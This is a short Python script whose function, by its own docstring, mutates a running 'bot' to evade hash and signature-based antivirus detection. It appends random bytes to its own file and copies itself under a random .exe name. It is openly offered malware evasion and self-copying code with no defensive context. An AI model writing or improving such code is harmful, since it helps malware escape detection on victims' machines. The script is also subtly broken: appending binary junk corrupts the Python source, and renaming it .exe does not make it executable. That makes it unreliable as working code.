import os
import random
import shutil
import string

def polymorphic_mutate():
    """
    Mutates the running bot to evade hash/signature-based detection.
    """
    new_name = "".join(random.choices(string.ascii_lowercase, k=8)) + ".exe"
    try:
        with open(__file__, "ab") as f:
            f.write(os.urandom(random.randint(100, 1000)))
        print("[*] Junk data appended to alter signature.")
    except Exception as e:
        print(f"[!] Could not append data: {e}")

    try:
        current_path = os.path.abspath(__file__)
        new_path = os.path.join(os.path.dirname(current_path), new_name)
        shutil.copy2(current_path, new_path)
        print(f"[*] Mutated Identity: {new_name}")
    except Exception as e:
        print(f"[!] Renaming failed: {e}")

if __name__ == "__main__":
    polymorphic_mutate()